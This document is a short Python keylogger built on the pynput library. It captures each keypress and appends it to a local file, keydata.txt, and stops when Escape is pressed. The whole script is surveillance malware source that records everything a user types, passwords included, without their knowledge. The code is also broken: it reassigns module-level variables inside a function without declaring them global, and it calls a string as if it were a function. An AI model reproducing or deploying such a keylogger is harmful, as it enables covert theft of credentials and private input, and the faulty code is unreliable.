from pynput.keyboard import Key, Listener  

count = 0
Z=[]

def on_press(A):
    Z.append(A)
    count += 1
    write_1(Z)
    print(A)

    if count>=1:
        count = 0
        write_1(Z)
        Z = []

def on_release(A):
    if A == Key.esc:
        return False       

def write_1(var):
    with open("keydata.txt","a") as f:
        for i in var:
            new_var = str(i).replace("'",'')
            if new_var("space") > 0:
                f.write('\n')
            elif new_var.find("Key") == -1:
                f.write(new_var)

 
with Listener(on_press=on_press,on_release=on_release)as l:
    l.join()